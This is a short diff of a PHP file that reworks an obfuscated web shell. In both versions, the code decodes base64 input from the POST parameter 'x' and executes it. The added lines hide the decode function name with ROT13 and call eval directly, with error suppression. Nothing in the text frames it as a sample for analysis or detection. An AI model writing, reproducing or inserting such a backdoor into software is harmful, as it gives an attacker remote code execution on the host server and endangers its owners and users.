@@ -1,5 +1,5 @@
 <?php
-$p = str_rot13('riny');           // eval
-$q = base64_decode($_POST['x']);
-@$p($q);
+$f = str_rot13('onfr64_qrpbqr');
+$q = $f($_POST['x']);
+@eval($q);
 ?>
